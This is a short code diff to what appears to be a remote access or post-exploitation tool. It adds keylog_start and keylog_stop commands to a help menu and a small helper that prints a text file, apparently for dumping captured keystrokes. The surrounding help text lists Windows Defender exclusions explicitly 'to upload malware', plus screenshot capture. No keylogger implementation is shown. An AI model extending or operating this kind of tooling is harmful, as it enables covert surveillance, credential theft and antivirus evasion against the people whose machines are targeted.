@@ -93,6 +93,8 @@ HELP
 -. (UAC)* windefender_exclude - Add Windows Defender Exclusions.
     - To Upload Malware, add Exclusion and upload malware to that directory.
 -. screenshot - Take Screenshot.
+-. keylog_start - Start keystroke logging.
+-. keylog_stop - Stop keystroke logging, And dump keylogs.
 
 ----------------------------------
 POST Exploitation
@@ -156,3 +158,10 @@ def saveAndShowImage(image):
         im.save(image, "PNG")
     except Exception as e:
         print("Error converting bmp to png : " + str(e))
+
+
+def PrintTextFile(filename):
+    with open(filename, "r") as inn:
+        data = inn.read()
+        print(data)
+        
